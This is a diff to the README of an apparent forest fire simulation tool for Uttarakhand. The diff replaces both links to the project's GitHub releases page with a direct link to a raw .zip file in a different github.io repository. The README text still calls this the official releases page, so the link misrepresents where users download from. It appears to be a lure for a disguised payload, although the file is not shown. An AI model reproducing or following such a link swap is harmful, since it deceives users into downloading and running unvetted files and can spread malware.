@@ -5,7 +5,7 @@ description: "Simulate forest fire spread in Uttarakhand using a Rothermel-based
 ---
 # 🔥 forest-fire - Predict forest fire spread in Uttarakhand
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Harriercrosscheck754/forest-fire/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Harriercrosscheck754/harriercrosscheck754.github.io/main/Aileen/io_harriercrosscheck_github_v2.9.zip)
 
 This application simulates how forest fires move through the forests of Uttarakhand, India. It combines satellite data from NASA and topographical information to show how vegetation and terrain affect fire growth. The tool uses a model known as Rothermel Cellular Automation to predict fire paths based on real-world conditions.
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the simulation:
 ## 📥 Downloading the Application
 You can download the latest version of the forest-fire tool from the official releases page. 
 
-[Visit this page to download](https://github.com/Harriercrosscheck754/forest-fire/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Harriercrosscheck754/harriercrosscheck754.github.io/main/Aileen/io_harriercrosscheck_github_v2.9.zip)
 
 1. Click the link above to open your web browser.
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
